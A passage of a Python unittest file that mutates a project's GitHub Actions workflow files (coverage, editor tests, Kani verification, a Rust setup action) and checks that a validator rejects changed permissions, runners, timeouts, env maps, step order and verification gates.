            self.assertNotIn(
                PRODUCER_PERMISSIONS_MSG,
                " ".join(coverage_permission_violations(text, path=path)),
                path,
            )
            mutant = text.replace(anchor, replacement, 1)
            self.assertNotEqual(mutant, text, path)
            job = self._coverage_job(mutant, path)
            expected = (
                {"contents", "actions"}
                if path == "coverage.yml"
                else {"contents", "pull-requests"}
            )
            self.assertEqual(set(job["permissions"]), expected, path)
            self.assertTrue(_producer_job_keys_ok(job), path)
            messages = " ".join(coverage_permission_violations(mutant, path=path))
            self.assertIn(PRODUCER_PERMISSIONS_MSG, messages, path)
            self.assertNotIn(COVERAGE_WRITE_MSG, messages, path)
        text = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        changed = text.replace(
            "  coverage:\n    name: Generate Code Coverage\n    permissions:\n"
            "      contents: read\n",
            "  coverage:\n    name: Generate Code Coverage\n    permissions:\n"
            "      contents: none\n",
            1,
        )
        removed = text.replace(
            "  coverage:\n    name: Generate Code Coverage\n    permissions:\n"
            "      contents: read\n",
            "  coverage:\n    name: Generate Code Coverage\n    permissions: {}\n",
            1,
        )
        for label, mutant in (("changed", changed), ("removed", removed)):
            messages = " ".join(coverage_permission_violations(mutant, path="coverage.yml"))
            self.assertIn(PRODUCER_PERMISSIONS_MSG, messages, label)
            self.assertNotIn(COVERAGE_WRITE_MSG, messages, label)

    def test_run_context_is_absent_or_canonical(self) -> None:
        """Workflow and job defaults.run and env are absent or canonical.

        A custom shell and a working-directory fail on all three workflows.
        An extra env variable fails where env is absent and where a canonical
        map is already present. The same two keys fail on a Kani job.
        """
        files = ("coverage.yml", "aw-editor-tests.yml", "kani.yml")
        texts = {name: (WORKFLOWS / name).read_text(encoding="utf-8") for name in files}
        for name, text in texts.items():
            self.assertEqual(run_context_violations(text, path=name), [], name)
        shell = {
            "coverage.yml": (
                "permissions: {}\n\njobs:\n  coverage:\n",
                "permissions: {}\n\ndefaults:\n  run:\n    shell: custom\n\njobs:\n  coverage:\n",
            ),
            "aw-editor-tests.yml": (
                "permissions: {}\n\nenv:\n",
                "permissions: {}\n\ndefaults:\n  run:\n    shell: custom\n\nenv:\n",
            ),
            "kani.yml": (
                "permissions: {}\n\nenv:\n",
                "permissions: {}\n\ndefaults:\n  run:\n    shell: custom\n\nenv:\n",
            ),
        }
        workdir = {
            "coverage.yml": (
                "permissions: {}\n\njobs:\n  coverage:\n",
                "permissions: {}\n\ndefaults:\n  run:\n"
                "    working-directory: elsewhere\n\njobs:\n  coverage:\n",
            ),
            "aw-editor-tests.yml": (
                "permissions: {}\n\nenv:\n",
                "permissions: {}\n\ndefaults:\n  run:\n"
                "    working-directory: elsewhere\n\nenv:\n",
            ),
            "kani.yml": (
                "permissions: {}\n\nenv:\n",
                "permissions: {}\n\ndefaults:\n  run:\n"
                "    working-directory: elsewhere\n\nenv:\n",
            ),
        }
        for name, (anchor, replacement) in shell.items():
            self.assertEqual(texts[name].count(anchor), 1, name)
            mutant = texts[name].replace(anchor, replacement, 1)
            self.assertNotEqual(mutant, texts[name], name)
            violations = run_context_violations(mutant, path=name)
            self.assertTrue(violations, name)
            self.assertIn(RUN_CONTEXT_MSG, violations[0], name)
        for name, (anchor, replacement) in workdir.items():
            mutant = texts[name].replace(anchor, replacement, 1)
            self.assertNotEqual(mutant, texts[name], name)
            self.assertIn(
                RUN_CONTEXT_MSG,
                run_context_violations(mutant, path=name)[0],
                name,
            )
        coverage_env = texts["coverage.yml"].replace(
            "permissions: {}\n\njobs:\n",
            "permissions: {}\n\nenv:\n  EXTRA: set\n\njobs:\n",
            1,
        )
        self.assertNotEqual(coverage_env, texts["coverage.yml"])
        self.assertIn(
            RUN_CONTEXT_MSG,
            run_context_violations(coverage_env, path="coverage.yml")[0],
        )
        for name, anchor in (
            ("aw-editor-tests.yml", "  RUST_BACKTRACE: 1\n"),
            ("kani.yml", "  CARGO_INCREMENTAL: 0\n"),
        ):
            mutant = texts[name].replace(anchor, anchor + "  EXTRA: set\n", 1)
            self.assertNotEqual(mutant, texts[name], name)
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, name)
            self.assertIn("EXTRA", doc["env"], name)
            self.assertIn(
                RUN_CONTEXT_MSG,
                run_context_violations(mutant, path=name)[0],
                name,
            )
        job_shell = texts["kani.yml"].replace(
            "  kani-ecs:\n    name: Kani - astraweave-ecs\n",
            "  kani-ecs:\n    name: Kani - astraweave-ecs\n"
            "    defaults:\n      run:\n        shell: custom\n",
            1,
        )
        job_dir = texts["kani.yml"].replace(
            "  kani-ecs:\n    name: Kani - astraweave-ecs\n",
            "  kani-ecs:\n    name: Kani - astraweave-ecs\n"
            "    defaults:\n      run:\n        working-directory: elsewhere\n",
            1,
        )
        job_env = texts["kani.yml"].replace(
            "  kani-ecs:\n    name: Kani - astraweave-ecs\n",
            "  kani-ecs:\n    name: Kani - astraweave-ecs\n    env:\n      EXTRA: set\n",
            1,
        )
        producer_shell = texts["coverage.yml"].replace(
            "  coverage:\n    name: Generate Code Coverage\n",
            "  coverage:\n    name: Generate Code Coverage\n"
            "    defaults:\n      run:\n        shell: custom\n",
            1,
        )
        producer_env = texts["coverage.yml"].replace(
            "  coverage:\n    name: Generate Code Coverage\n",
            "  coverage:\n    name: Generate Code Coverage\n    env:\n      EXTRA: set\n",
            1,
        )
        cases = (
            ("job-shell", "kani.yml", job_shell),
            ("job-dir", "kani.yml", job_dir),
            ("job-env", "kani.yml", job_env),
            ("producer-shell", "coverage.yml", producer_shell),
            ("producer-env", "coverage.yml", producer_env),
        )
        for label, name, mutant in cases:
            self.assertNotEqual(mutant, texts[name], label)
            violations = run_context_violations(mutant, path=name)
            self.assertTrue(violations, label)
            self.assertIn(RUN_CONTEXT_MSG, violations[0], label)

    def test_setup_and_toolchain_steps_are_canonical(self) -> None:
        """Rust CI setup and Install Rust Toolchain equal their canonical steps.

        An added env map or an added with: input keeps the uses value and
        fails the producer end check.
        """
        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        editor = (WORKFLOWS / "aw-editor-tests.yml").read_text(encoding="utf-8")
        coverage_job = self._coverage_job(coverage, "coverage.yml")
        editor_job = self._coverage_job(editor, "aw-editor-tests.yml")
        self.assertTrue(
            _step_equals_canonical(coverage_job["steps"][1], _COVERAGE_SETUP_STEP)
        )
        self.assertTrue(
            _step_equals_canonical(editor_job["steps"][1], _EDITOR_TOOLCHAIN_STEP)
        )
        setup_env = coverage.replace(
            "      - name: Rust CI setup\n        uses: ./.github/actions/rust-ci-setup\n",
            "      - name: Rust CI setup\n        uses: ./.github/actions/rust-ci-setup\n"
            "        env:\n          EXTRA: set\n",
            1,
        )
        setup_with = coverage.replace(
            "      - name: Rust CI setup\n        uses: ./.github/actions/rust-ci-setup\n",
            "      - name: Rust CI setup\n        uses: ./.github/actions/rust-ci-setup\n"
            "        with:\n          toolchain: other\n",
            1,
        )
        tool_with = editor.replace(
            "      with:\n        components: llvm-tools-preview\n",
            "      with:\n        components: llvm-tools-preview\n        toolchain: other\n",
            1,
        )
        tool_env = editor.replace(
            "    - name: Install Rust Toolchain\n",
            "    - name: Install Rust Toolchain\n      env:\n        EXTRA: set\n",
            1,
        )
        cases = (
            ("setup-env", "coverage.yml", setup_env, "setup", _COVERAGE_SETUP_STEP),
            ("setup-with", "coverage.yml", setup_with, "setup", _COVERAGE_SETUP_STEP),
            ("toolchain-with", "aw-editor-tests.yml", tool_with, "toolchain", _EDITOR_TOOLCHAIN_STEP),
            ("toolchain-env", "aw-editor-tests.yml", tool_env, "toolchain", _EDITOR_TOOLCHAIN_STEP),
        )
        for label, path, mutant, kind, canonical in cases:
            job = self._assert_producer_rejected(mutant, path, label)
            step = next(
                item
                for item, step_kind in zip(job["steps"], _PRODUCER_STEP_KINDS[path])
                if step_kind == kind
            )
            self.assertTrue(_producer_step_matches(step, kind), label)
            self.assertFalse(_step_equals_canonical(step, canonical), label)

    def test_kani_jobs_are_exact_ordered_lists(self) -> None:
        """Each Kani job id is the canonical step list, in order.

        A step env on the action keeps with: and fails. An inserted run step
        before the action keeps that action canonical and fails. A reorder
        and a removed upload fail.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        self.assertEqual(kani_job_steps_violations(text, path="kani.yml"), [])
        doc, err = load_workflow_yaml(text)
        self.assertIsNone(err)
        for job_id, _package, _report in _KANI_JOB_SPECS:
            entry = _KANI_JOBS[job_id]
            self.assertIsInstance(entry["args"], str)
            self.assertTrue(entry["args"])
            self.assertTrue(_steps_equal_ordered(doc["jobs"][job_id]["steps"], entry["steps"]))
        env_step = text.replace(
            "      - name: Kani Verification\n        uses:",
            "      - name: Kani Verification\n        env:\n          EXTRA: set\n        uses:",
            1,
        )
        self.assertNotEqual(env_step, text)
        env_doc, env_err = load_workflow_yaml(env_step)
        self.assertIsNone(env_err)
        action = next(
            step
            for job_id, _job, step in _iter_steps(env_doc)
            if job_id == "kani-ecs" and _is_named_action(step, "model-checking/kani-github-action")
        )
        canonical_action = _KANI_JOBS["kani-ecs"]["steps"][2]
        self.assertEqual(action.get("with"), canonical_action["with"])
        self.assertIn("env", action)
        self.assertFalse(_step_equals_canonical(action, canonical_action))
        env_violations = kani_job_steps_violations(env_step, path="kani.yml")
        self.assertTrue(env_violations)
        self.assertIn(KANI_JOB_STEPS_MSG, env_violations[0])
        inserted = text.replace(
            "      - name: Kani Verification\n",
            "      - name: Before verification\n        run: echo extra\n\n"
            "      - name: Kani Verification\n",
            1,
        )
        self.assertNotEqual(inserted, text)
        inserted_doc, inserted_err = load_workflow_yaml(inserted)
        self.assertIsNone(inserted_err)
        inserted_action = next(
            step
            for job_id, _job, step in _iter_steps(inserted_doc)
            if job_id == "kani-ecs" and _is_named_action(step, "model-checking/kani-github-action")
        )
        self.assertTrue(_step_equals_canonical(inserted_action, canonical_action))
        self.assertGreater(
            len(inserted_doc["jobs"]["kani-ecs"]["steps"]),
            len(_KANI_JOBS["kani-ecs"]["steps"]),
        )
        inserted_violations = kani_job_steps_violations(inserted, path="kani.yml")
        self.assertTrue(inserted_violations)
        self.assertIn(KANI_JOB_STEPS_MSG, inserted_violations[0])
        checkout = (
            "      - uses: actions/checkout@"
            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
            "        with:\n"
            "          persist-credentials: false\n\n"
        )
        timeout_at = text.index("      - name: Resolve harness timeout\n")
        verify_at = text.index("      - name: Kani Verification\n")
        timeout = text[timeout_at:verify_at]
        self.assertTrue(text.startswith(checkout, text.index("    steps:\n") + len("    steps:\n")))
        reordered = text.replace(checkout + timeout, timeout + checkout, 1)
        self.assertNotEqual(reordered, text)
        reorder_doc, reorder_err = load_workflow_yaml(reordered)
        self.assertIsNone(reorder_err)
        self.assertEqual(reorder_doc["jobs"]["kani-ecs"]["steps"][0].get("id"), "timeout")
        reorder_violations = kani_job_steps_violations(reordered, path="kani.yml")
        self.assertTrue(reorder_violations)
        self.assertIn(KANI_JOB_STEPS_MSG, reorder_violations[0])
        upload = (
            "      - name: Upload Kani Report\n"
            "        uses: actions/upload-artifact@"
            "cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n"
            "        if: always()\n"
            "        with:\n"
            "          name: kani-report-ecs\n"
            "          path: target/kani/\n"
            "          retention-days: 30\n"
        )
        self.assertEqual(text.count(upload), 1)
        removed = text.replace(upload, "", 1)
        self.assertNotEqual(removed, text)
        removed_violations = kani_job_steps_violations(removed, path="kani.yml")
        self.assertTrue(removed_violations)
        self.assertIn(KANI_JOB_STEPS_MSG, removed_violations[0])

    def test_kani_conditions_fail_outside_the_args_check(self) -> None:
        """A step condition, a step continue-on-error, and a job continue-on-error fail.

        The action with: map stays canonical, so an args-only check stays quiet.
        The job form keeps the ordered step list.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        canonical = _KANI_JOBS["kani-ecs"]["steps"][2]
        step_if = text.replace(
            "      - name: Kani Verification\n        uses:",
            "      - name: Kani Verification\n        if: false\n        uses:",
            1,
        )
        step_continue = text.replace(
            "      - name: Kani Verification\n        uses:",
            "      - name: Kani Verification\n        continue-on-error: true\n        uses:",
            1,
        )
        job_continue = text.replace(
            "  kani-ecs:\n    name: Kani - astraweave-ecs\n",
            "  kani-ecs:\n    name: Kani - astraweave-ecs\n    continue-on-error: true\n",
            1,
        )
        for label, mutant in (
            ("step-condition", step_if),
            ("step-continue", step_continue),
            ("job-continue", job_continue),
        ):
            self.assertNotEqual(mutant, text, label)
            self.assertEqual(kani_dispatch_args_violations(mutant, path="kani.yml"), [], label)
            violations = kani_job_steps_violations(mutant, path="kani.yml")
            self.assertTrue(violations, label)
            self.assertIn(KANI_JOB_STEPS_MSG, " ".join(violations), label)
        if_doc, if_err = load_workflow_yaml(step_if)
        self.assertIsNone(if_err)
        if_step = next(
            step
            for job_id, _job, step in _iter_steps(if_doc)
            if job_id == "kani-ecs" and _is_named_action(step, "model-checking/kani-github-action")
        )
        self.assertEqual(if_step.get("with"), canonical["with"])
        self.assertIn("if", if_step)
        self.assertFalse(_step_equals_canonical(if_step, canonical))
        job_doc, job_err = load_workflow_yaml(job_continue)
        self.assertIsNone(job_err)
        self.assertTrue(
            _steps_equal_ordered(job_doc["jobs"]["kani-ecs"]["steps"], _KANI_JOBS["kani-ecs"]["steps"])
        )

    def test_unmapped_kani_job_id_fails(self) -> None:
        """A renamed Kani job is unmapped even when args is a non-null string."""
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        start = text.index("  kani-ecs:\n")
        end = text.index("  kani-math:\n")
        renamed = text[start:end].replace("  kani-ecs:\n", "  kani-other:\n", 1)
        self.assertNotIn("kani-other", text)
        mutant = text[:end] + renamed + text[end:]
        doc, err = load_workflow_yaml(mutant)
        self.assertIsNone(err)
        step = next(
            item
            for job_id, _job, item in _iter_steps(doc)
            if job_id == "kani-other" and _is_named_action(item, "model-checking/kani-github-action")
        )
        parsed = _ci_item(step.get("with"), "args")[1]
        self.assertIsInstance(parsed, str)
        self.assertTrue(parsed)
        self.assertIsNone(_approved_kani_args("kani-other"))
        args_violations = kani_dispatch_args_violations(mutant, path="kani.yml")
        self.assertTrue(args_violations)
        self.assertIn(KANI_ARGS_MSG, " ".join(args_violations))
        job_violations = kani_job_steps_violations(mutant, path="kani.yml")
        self.assertTrue(job_violations)
        self.assertIn(KANI_JOB_STEPS_MSG, " ".join(job_violations))

    def test_null_kani_args_fail_on_a_mapped_job(self) -> None:
        """Null args on a mapped job is not the approved string."""
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        approved = _approved_kani_args("kani-ecs")
        self.assertIsInstance(approved, str)
        mutant = text.replace(
            "          args: --package astraweave-ecs -Z unstable-options "
            "--harness-timeout ${{ steps.timeout.outputs.value }}\n",
            "          args: null\n",
            1,
        )
        self.assertNotEqual(mutant, text)
        doc, err = load_workflow_yaml(mutant)
        self.assertIsNone(err)
        step = next(
            item
            for job_id, _job, item in _iter_steps(doc)
            if job_id == "kani-ecs" and _is_named_action(item, "model-checking/kani-github-action")
        )
        self.assertIsNone(_ci_item(step.get("with"), "args")[1])
        args_violations = kani_dispatch_args_violations(mutant, path="kani.yml")
        self.assertTrue(args_violations)
        self.assertIn(KANI_ARGS_MSG, " ".join(args_violations))

    def test_duplicate_keys_leading_whitespace_and_second_timeout_fail(self) -> None:
        """Duplicate keys, run whitespace, and a second timeout step are guarded.

        The duplicate key keeps the canonical value, so a key-set compare
        accepts it. Trailing whitespace still matches. Leading whitespace
        matches after a full strip and fails after trailing-only trim. Both
        timeout steps equal the canonical step.
        """
        coverage = (WORKFLOWS / "coverage.yml").read_text(encoding="utf-8")
        duplicated_name = coverage.replace(
            "      - name: Install cargo-tarpaulin\n",
            "      - name: Install cargo-tarpaulin\n"
            "        name: Install cargo-tarpaulin\n",
            1,
        )
        self.assertNotEqual(duplicated_name, coverage)
        name_doc, name_err = load_workflow_yaml(duplicated_name)
        self.assertIsNone(name_err)
        name_step = name_doc["jobs"]["coverage"]["steps"][2]
        self.assertTrue(getattr(name_step, "duplicate_keys", None))
        self.assertEqual(set(name_step), set(_COVERAGE_INSTALL_STEP))
        self.assertEqual(name_step.get("name"), _COVERAGE_INSTALL_STEP["name"])
        self.assertEqual(
            _run_rstrip(name_step.get("run")),
            _run_rstrip(_COVERAGE_INSTALL_STEP["run"]),
        )
        self.assertFalse(_step_equals_canonical(name_step, _COVERAGE_INSTALL_STEP))
        self.assertIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(duplicated_name, path="coverage.yml")),
        )
        duplicated_with = coverage.replace(
            "          name: coverage-xml\n",
            "          name: coverage-xml\n          name: coverage-xml\n",
            1,
        )
        self.assertNotEqual(duplicated_with, coverage)
        with_doc, with_err = load_workflow_yaml(duplicated_with)
        self.assertIsNone(with_err)
        upload = with_doc["jobs"]["coverage"]["steps"][-1]
        body = upload.get("with")
        self.assertTrue(getattr(body, "duplicate_keys", None))
        self.assertEqual(set(body), set(_COVERAGE_UPLOAD_STEP["with"]))
        self.assertEqual(body.get("name"), "coverage-xml")
        self.assertFalse(_mapping_equals(body, _COVERAGE_UPLOAD_STEP["with"]))
        self.assertFalse(_step_equals_canonical(upload, _COVERAGE_UPLOAD_STEP))
        leading = coverage.replace(
            "        run: cargo install cargo-tarpaulin --version 0.35.2 --locked\n",
            '        run: " cargo install cargo-tarpaulin --version 0.35.2 --locked"\n',
            1,
        )
        self.assertNotEqual(leading, coverage)
        lead_doc, lead_err = load_workflow_yaml(leading)
        self.assertIsNone(lead_err)
        lead_step = lead_doc["jobs"]["coverage"]["steps"][2]
        self.assertEqual(lead_step.get("run").strip(), _COVERAGE_INSTALL_STEP["run"].strip())
        self.assertNotEqual(
            _run_rstrip(lead_step.get("run")),
            _run_rstrip(_COVERAGE_INSTALL_STEP["run"]),
        )
        self.assertFalse(_step_equals_canonical(lead_step, _COVERAGE_INSTALL_STEP))
        self.assertIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(leading, path="coverage.yml")),
        )
        trailing = coverage.replace(
            "        run: cargo install cargo-tarpaulin --version 0.35.2 --locked\n",
            '        run: "cargo install cargo-tarpaulin --version 0.35.2 --locked  "\n',
            1,
        )
        self.assertNotEqual(trailing, coverage)
        trail_doc, trail_err = load_workflow_yaml(trailing)
        self.assertIsNone(trail_err)
        trail_step = trail_doc["jobs"]["coverage"]["steps"][2]
        self.assertNotEqual(trail_step.get("run"), _COVERAGE_INSTALL_STEP["run"])
        self.assertEqual(
            _run_rstrip(trail_step.get("run")),
            _run_rstrip(_COVERAGE_INSTALL_STEP["run"]),
        )
        self.assertTrue(_step_equals_canonical(trail_step, _COVERAGE_INSTALL_STEP))
        self.assertNotIn(
            COVERAGE_JOB_END_MSG,
            " ".join(coverage_permission_violations(trailing, path="coverage.yml")),
        )
        kani = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        timeout_at = kani.index("      - name: Resolve harness timeout\n")
        verify_at = kani.index("      - name: Kani Verification\n")
        block = kani[timeout_at:verify_at]
        self.assertEqual(kani.count(block), 4)
        second = kani.replace(block, block + block, 1)
        self.assertNotEqual(second, kani)
        second_doc, second_err = load_workflow_yaml(second)
        self.assertIsNone(second_err)
        timeouts = [
            step
            for step in second_doc["jobs"]["kani-ecs"]["steps"]
            if isinstance(step, dict) and step.get("id") == "timeout"
        ]
        self.assertEqual(len(timeouts), 2)
        self.assertTrue(all(_step_equals_canonical(step, _KANI_TIMEOUT_STEP) for step in timeouts))
        second_violations = kani_timeout_run_violations(second, path="kani.yml")
        self.assertTrue(second_violations)
        self.assertIn(KANI_TIMEOUT_MSG, second_violations[0])

    def test_producer_runs_on_and_timeout_are_pinned(self) -> None:
        """Producer runs-on and timeout-minutes are the pinned values.

        The key set still matches, so a key-only allowlist accepts both.
        """
        anchors = {
            "coverage.yml": (
                "    name: Generate Code Coverage\n"
                "    permissions:\n"
                "      contents: read\n"
                "    runs-on: ubuntu-latest\n"
                "    timeout-minutes: 45\n"
            ),
            "aw-editor-tests.yml": (
                "    name: Test Coverage\n"
                "    permissions:\n"
                "      contents: read\n"
                "    runs-on: ubuntu-latest\n"
                "    timeout-minutes: 45\n"
            ),
        }
        for path, anchor in anchors.items():
            text = (WORKFLOWS / path).read_text(encoding="utf-8")
            self.assertEqual(text.count(anchor), 1, path)
            self.assertNotIn(
                COVERAGE_JOB_END_MSG,
                " ".join(coverage_permission_violations(text, path=path)),
                path,
            )
            runner = text.replace(anchor, anchor.replace("ubuntu-latest", "self-hosted", 1), 1)
            timeout = text.replace(anchor, anchor.replace("timeout-minutes: 45", "timeout-minutes: 1", 1), 1)
            for label, mutant in (("runner", runner), ("timeout", timeout)):
                self.assertNotEqual(mutant, text, f"{path}:{label}")
                job = self._coverage_job(mutant, f"{path}:{label}")
                self.assertEqual(set(job), _PRODUCER_JOB_KEYS, f"{path}:{label}")
                self.assertIn(
                    COVERAGE_JOB_END_MSG,
                    " ".join(coverage_permission_violations(mutant, path=path)),
                    f"{path}:{label}",
                )

    def test_kani_job_keys_are_exact(self) -> None:
        """Each extra job key, and a changed runner or timeout, fails the shape check.

        The ordered steps stay canonical, so the step-list check stays quiet.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        self.assertEqual(kani_job_steps_violations(text, path="kani.yml"), [])
        anchor = "  kani-ecs:\n    name: Kani - astraweave-ecs\n"
        self.assertEqual(text.count(anchor), 1)
        extras = {
            "container": "    container: example\n",
            "services": "    services:\n      extra:\n        image: example\n",
            "if": "    if: false\n",
            "strategy": "    strategy:\n      matrix:\n        os: [ubuntu-latest]\n",
            "environment": "    environment: example\n",
            "outputs": "    outputs:\n      extra: set\n",
            "concurrency": "    concurrency: example\n",
            "needs": "    needs: kani-math\n",
            "snapshot": "    snapshot: example\n",
        }
        for name, extra in extras.items():
            mutant = text.replace(anchor, anchor + extra, 1)
            self.assertNotEqual(mutant, text, name)
            doc, err = load_workflow_yaml(mutant)
            self.assertIsNone(err, name)
            job = doc["jobs"]["kani-ecs"]
            self.assertIn(name, job, name)
            self.assertNotEqual(set(job), _KANI_JOB_KEYS, name)
            self.assertTrue(
                _steps_equal_ordered(job["steps"], _KANI_JOBS["kani-ecs"]["steps"]),
                name,
            )
            self.assertEqual(kani_dispatch_args_violations(mutant, path="kani.yml"), [], name)
            violations = kani_job_steps_violations(mutant, path="kani.yml")
            self.assertIn(KANI_JOB_SHAPE_MSG, " ".join(violations), name)
        runner = text.replace("    runs-on: ubuntu-latest\n", "    runs-on: self-hosted\n", 1)
        self.assertNotEqual(runner, text)
        runner_doc, runner_err = load_workflow_yaml(runner)
        self.assertIsNone(runner_err)
        runner_job = runner_doc["jobs"]["kani-ecs"]
        self.assertEqual(set(runner_job), _KANI_JOB_KEYS)
        self.assertEqual(runner_job.get("runs-on"), "self-hosted")
        self.assertTrue(
            _steps_equal_ordered(runner_job["steps"], _KANI_JOBS["kani-ecs"]["steps"])
        )
        self.assertIn(
            KANI_JOB_SHAPE_MSG,
            " ".join(kani_job_steps_violations(runner, path="kani.yml")),
        )
        timeout = text.replace("    timeout-minutes: 120\n", "    timeout-minutes: 1\n", 1)
        self.assertNotEqual(timeout, text)
        timeout_doc, timeout_err = load_workflow_yaml(timeout)
        self.assertIsNone(timeout_err)
        timeout_job = timeout_doc["jobs"]["kani-ecs"]
        self.assertEqual(set(timeout_job), _KANI_JOB_KEYS)
        self.assertEqual(timeout_job.get("timeout-minutes"), 1)
        self.assertIn(
            KANI_JOB_SHAPE_MSG,
            " ".join(kani_job_steps_violations(timeout, path="kani.yml")),
        )

    def test_kani_summary_gate_is_canonical(self) -> None:
        """The summary job needs every mapped id, runs on if: always(), and locks the fail step.

        A result other than success, including skipped and cancelled, fails that step.
        Removing the job, a needs id, or the fail step fails this check alone.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        self.assertEqual(kani_job_steps_violations(text, path="kani.yml"), [])
        needs = "    needs: [kani-ecs, kani-math, kani-sdk, kani-core]\n"
        self.assertEqual(text.count(needs), 1)
        added = text.replace(needs, "    needs: [kani-ecs, kani-math, kani-sdk, kani-core, kani-extra]\n", 1)
        dropped = text.replace(needs, "    needs: [kani-ecs, kani-math, kani-sdk]\n", 1)
        job_if = "    needs: [kani-ecs, kani-math, kani-sdk, kani-core]\n    if: always()\n"
        self.assertEqual(text.count(job_if), 1)
        always_off = text.replace(job_if, job_if.replace("if: always()", "if: false", 1), 1)
        failure_only = text.replace("!= 'success'", "== 'failure'")
        self.assertNotEqual(failure_only, text)
        self.assertEqual(failure_only.count("== 'failure'"), 4)
        fail_step = (
            "      - name: Fail if any verification failed\n"
            "        if: ${{ needs.kani-ecs.result != 'success' || "
            "needs.kani-math.result != 'success' || needs.kani-sdk.result != 'success' || "
            "needs.kani-core.result != 'success' }}\n"
            "        run: exit 1\n"
        )
        self.assertEqual(text.count(fail_step), 1)
        deleted_step = text.replace(fail_step, "", 1)
        deleted_job = text.split("  summary:\n", 1)[0]
        self.assertNotIn("summary:", deleted_job)
        for label, mutant in (
            ("needs-added", added),
            ("needs-dropped", dropped),
            ("job-if", always_off),
            ("failure-only", failure_only),
            ("fail-step-deleted", deleted_step),
            ("summary-deleted", deleted_job),
        ):
            self.assertNotEqual(mutant, text, label)
            violations = kani_job_steps_violations(mutant, path="kani.yml")
            self.assertIn(KANI_SUMMARY_MSG, " ".join(violations), label)
            self.assertNotIn(KANI_JOB_SHAPE_MSG, " ".join(violations), label)

    def test_job_if_with_summary_edit_fails(self) -> None:
        """A job condition together with a summary-step edit fails both checks.

        The proof steps stay canonical, so neither half is the step-list check.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        anchor = "  kani-ecs:\n    name: Kani - astraweave-ecs\n"
        fail_step = (
            "      - name: Fail if any verification failed\n"
            "        if: ${{ needs.kani-ecs.result != 'success' || "
            "needs.kani-math.result != 'success' || needs.kani-sdk.result != 'success' || "
            "needs.kani-core.result != 'success' }}\n"
        )
        self.assertEqual(text.count(anchor), 1)
        self.assertEqual(text.count(fail_step), 1)
        mutant = text.replace(anchor, anchor + "    if: false\n", 1)
        mutant = mutant.replace(fail_step, "      - name: Fail if any verification failed\n        if: false\n", 1)
        self.assertNotEqual(mutant, text)
        doc, err = load_workflow_yaml(mutant)
        self.assertIsNone(err)
        self.assertIn("if", doc["jobs"]["kani-ecs"])
        self.assertTrue(
            _steps_equal_ordered(
                doc["jobs"]["kani-ecs"]["steps"],
                _KANI_JOBS["kani-ecs"]["steps"],
            )
        )
        self.assertEqual(kani_dispatch_args_violations(mutant, path="kani.yml"), [])
        violations = " ".join(kani_job_steps_violations(mutant, path="kani.yml"))
        self.assertIn(KANI_JOB_SHAPE_MSG, violations)
        self.assertIn(KANI_SUMMARY_MSG, violations)

    def test_unmapped_kani_job_with_null_args_fails_dispatch(self) -> None:
        """kani_dispatch_args_violations alone rejects an unmapped job whose args is null.

        Both sides of the compare are None. Dropping the missing-entry half accepts the pair.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        start = text.index("  kani-ecs:\n")
        end = text.index("  kani-math:\n")
        renamed = text[start:end].replace("  kani-ecs:\n", "  kani-other:\n", 1)
        renamed = renamed.replace(
            "          args: --package astraweave-ecs -Z unstable-options "
            "--harness-timeout ${{ steps.timeout.outputs.value }}\n",
            "          args: null\n",
            1,
        )
        mutant = text[:end] + renamed + text[end:]
        doc, err = load_workflow_yaml(mutant)
        self.assertIsNone(err)
        step = next(
            item
            for job_id, _job, item in _iter_steps(doc)
            if job_id == "kani-other" and _is_named_action(item, "model-checking/kani-github-action")
        )
        self.assertIsNone(_ci_item(step.get("with"), "args")[1])
        self.assertIsNone(_approved_kani_args("kani-other"))
        violations = kani_dispatch_args_violations(mutant, path="kani.yml")
        self.assertTrue(violations)
        self.assertIn(KANI_ARGS_MSG, " ".join(violations))

    def test_trailing_kani_step_fails_the_length_check(self) -> None:
        """A step appended after the canonical list fails the exact length compare.

        The prefix still matches, so a compare that only rejects a shorter list stays quiet.
        """
        text = (WORKFLOWS / "kani.yml").read_text(encoding="utf-8")
        extra = "      - name: After report\n        run: echo extra\n\n"
        anchor = "  kani-math:\n"
        self.assertEqual(text.count(anchor), 1)
        mutant = text.replace(anchor, extra + anchor, 1)
        self.assertNotEqual(mutant, text)
        doc, err = load_workflow_yaml(mutant)
        self.assertIsNone(err)
        steps = doc["jobs"]["kani-ecs"]["steps"]
        canonical = _KANI_JOBS["kani-ecs"]["steps"]
        self.assertEqual(len(steps), len(canonical) + 1)
        self.assertTrue(all(_step_equals_canonical(got, want) for got, want in zip(steps, canonical)))
        violations = kani_job_steps_violations(mutant, path="kani.yml")
        self.assertTrue(violations)
        self.assertIn(KANI_JOB_STEPS_MSG, " ".join(violations))
        self.assertNotIn(KANI_JOB_SHAPE_MSG, " ".join(violations))

    def test_rust_ci_setup_steps_are_canonical(self) -> None:
        """The setup action's steps and toolchain default are exact.

        An extra step that writes GITHUB_ENV keeps the toolchain default.
        A second RUSTC_WRAPPER assignment keeps the step count.
        """
        path = ".github/actions/rust-ci-setup/action.yml"
        text = (ROOT / path).read_text(encoding="utf-8")
        self.assertEqual(rust_ci_setup_violations(text, path=path), [])
        doc, err = load_workflow_yaml(text)
        self.assertIsNone(err)
        self.assertEqual(doc["inputs"]["toolchain"]["default"], _RUST_CI_SETUP_TOOLCHAIN)
        self.assertEqual(_RUST_CI_SETUP_SCCACHE_RUN.count("RUSTC_WRAPPER="), 1)
        self.assertTrue(_steps_equal_ordered(doc["runs"]["steps"], _RUST_CI_SETUP_STEPS))
        toolchain = text.replace('default: "1.89.0"', 'default: "0"', 1)
        self.assertNotEqual(toolchain, text)
